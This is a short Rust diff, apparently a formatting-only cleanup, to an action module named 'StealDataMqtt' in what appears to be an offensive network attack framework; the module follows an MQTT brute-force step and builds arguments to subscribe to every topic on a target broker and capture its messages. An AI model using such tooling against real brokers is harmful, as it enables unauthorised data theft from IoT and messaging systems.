@@ -15,9 +15,15 @@ use super::{build_output_dir, get_credentials};
 pub struct StealDataMqtt;
 
 impl Action for StealDataMqtt {
-    fn name(&self) -> &'static str { "StealDataMQTT" }
-    fn port(&self) -> Option<u16> { Some(1883) }
-    fn parent(&self) -> Option<&'static str> { Some("MQTTBruteforce") }
+    fn name(&self) -> &'static str {
+        "StealDataMQTT"
+    }
+    fn port(&self) -> Option<u16> {
+        Some(1883)
+    }
+    fn parent(&self) -> Option<&'static str> {
+        Some("MQTTBruteforce")
+    }
 
     fn execute<'a>(
         &'a self,
@@ -70,11 +76,15 @@ async fn capture_mqtt(
     local_dir: &std::path::Path,
 ) -> Result<usize, String> {
     let mut args = vec![
-        "-h".to_string(), ip.to_string(),
-        "-t".to_string(), "#".to_string(),  // Subscribe to all topics
-        "-v".to_string(),                    // Verbose (print topic name)
-        "-C".to_string(), "100".to_string(), // Capture 100 messages then exit
-        "-W".to_string(), "30".to_string(),  // Wait max 30 seconds
+        "-h".to_string(),
+        ip.to_string(),
+        "-t".to_string(),
+        "#".to_string(),  // Subscribe to all topics
+        "-v".to_string(), // Verbose (print topic name)
+        "-C".to_string(),
+        "100".to_string(), // Capture 100 messages then exit
+        "-W".to_string(),
+        "30".to_string(), // Wait max 30 seconds
     ];
 
     if !user.is_empty() {
